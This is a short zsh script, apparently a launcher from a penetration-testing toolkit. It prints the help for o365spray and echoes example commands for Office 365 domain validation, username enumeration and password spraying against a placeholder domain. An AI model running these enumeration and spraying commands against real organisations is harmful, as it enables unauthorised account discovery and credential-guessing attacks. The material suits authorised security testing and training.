#!/bin/zsh

# Execute the help command for o365spray
echo -e "\nExecuting: \033[0;92mpython3 o365spray.py -h\033[0m"
python3 o365spray.py -h 2>/dev/null

# Provide example usage
echo -e "\n\033[0;94mExamples:\033[0m"

# Validate domain using O365
echo -e "\n\033[0;93mValidate domain using O365:\033[0m"
echo -e "\033[0;37mThis command validates if a domain is using Office 365.\033[0m"
echo -e "\n> \033[0;92mpython3 o365spray.py --validate --domain megabigtech.com\033[0m"

# Enumerate usernames for a given domain
echo -e "\n\033[0;93mEnumerate usernames for a given domain:\033[0m"
echo -e "\033[0;37mThis command performs username enumeration using a list of usernames (e.g., usernames.txt) for the specified domain.\033[0m"
echo -e "\n> \033[0;92mpython3 o365spray.py --enum -U usernames.txt --domain megabigtech.com\033[0m"

# Perform password spraying against a given domain
echo -e "\n\033[0;93mPerform password spraying against a given domain:\033[0m"
echo -e "\033[0;37mThis command performs password spraying using a list of usernames and passwords (e.g., usernames.txt, passwords.txt) against the specified domain.\033[0m"
echo -e "\n> \033[0;92mpython3 o365spray.py --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain megabigtech.com\033[0m"

# Provide the reference link
echo -e "\nFor more information, visit: \033[0;94mhttps://github.com/0xZDH/o365spray\033[0m"

# Keep the terminal open
exec zsh

